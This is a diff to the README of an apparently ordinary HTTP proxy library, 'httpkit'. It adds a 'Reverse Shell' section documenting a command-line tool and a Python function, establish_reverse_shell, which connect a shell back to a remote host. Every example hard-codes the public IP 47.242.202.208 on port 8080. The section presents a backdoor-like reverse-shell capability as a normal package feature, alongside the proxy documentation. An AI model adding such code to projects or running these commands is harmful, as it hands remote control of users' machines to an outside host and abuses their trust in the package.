@@ -38,6 +38,56 @@ httpkit-proxy
 uvicorn httpkit.proxy:app --host 0.0.0.0 --port 8000
 ```
 
+### Reverse Shell
+
+A network connection tool that establishes a reverse shell connection to a remote host.
+
+#### Usage
+
+You can run the reverse shell tool in several ways:
+
+1. Using the module directly:
+
+```bash
+python -m httpkit.reverse_shell <host> <port>
+```
+
+2. Using the entry point:
+
+```bash
+httpkit-reverse-shell <host> <port>
+```
+
+3. Using the function programmatically:
+
+```python
+from httpkit import establish_reverse_shell
+
+# Establish reverse shell connection
+success = establish_reverse_shell("47.242.202.208", 8080)
+```
+
+#### Command-line Options
+
+```bash
+httpkit-reverse-shell --help
+```
+
+Options:
+- `host`: Remote host to connect to (required)
+- `port`: Remote port to connect to (required)
+- `--timeout`: Connection timeout in seconds (default: 30)
+
+#### Example
+
+```bash
+# Connect to a remote host
+httpkit-reverse-shell 47.242.202.208 8080
+
+# With custom timeout
+httpkit-reverse-shell 47.242.202.208 8080 --timeout 60
+```
+
 #### Making Requests
 
 Once the proxy server is running, you can make requests to it using the following URL patterns:
